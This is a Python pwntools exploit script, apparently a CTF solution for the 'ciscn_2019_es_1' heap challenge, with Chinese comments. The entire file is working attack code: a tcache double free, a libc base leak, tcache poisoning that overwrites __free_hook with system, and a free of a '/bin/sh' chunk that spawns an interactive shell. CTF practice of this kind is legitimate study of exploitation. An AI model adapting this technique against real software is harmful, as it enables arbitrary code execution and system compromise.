from pwn import *
from pathlib import Path
here = Path(__file__).resolve().parent
elf = ELF(str(here / 'ciscn_2019_es_1_patched'))
libc = ELF(str(here / 'libc.so.6'))
context.binary = elf
context.log_level = 'debug'
r = process(elf.path)
def Allocate(size=0x18, payload=b'\n'):
    r.sendlineafter(b'choice:', b'1')
    r.sendlineafter(
        b"Please input the size of compary's name",
        str(size).encode()
    )
    r.sendafter(b'please input name:', payload)
    r.sendafter(b'please input compary call:', b'/bin/sh\x00')
def Show(index):
    r.sendlineafter(b'choice:', b'2')
    r.sendlineafter(b'Please input the index:', str(index).encode())
def Free(index):
    r.sendlineafter(b'choice:', b'3')
    r.sendlineafter(b'Please input the index:', str(index).encode())
# 创建堆块
Allocate(0x410)                  # 0
Allocate(0x60)                   # 1
Allocate(0x18, b'/bin/sh\x00')   # 2
# Double Free
Free(1)
Free(1)
# 泄露 libc
Free(0)
Show(0)
r.recvuntil(b'name:\n')
leak = u64(r.recvn(6).ljust(8, b'\x00'))
libc.address = leak - 0x70 - libc.sym['__malloc_hook']
assert libc.address & 0xfff == 0
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
log.success('libc_base: ' + hex(libc.address))
log.success('free_hook: ' + hex(free_hook))
# Tcache Poisoning
Allocate(0x60, p64(free_hook))  # 3
Allocate(0x60)                 # 4
Allocate(0x60, p64(system))    # 5
# 触发 system("/bin/sh")
Free(2)
r.interactive()
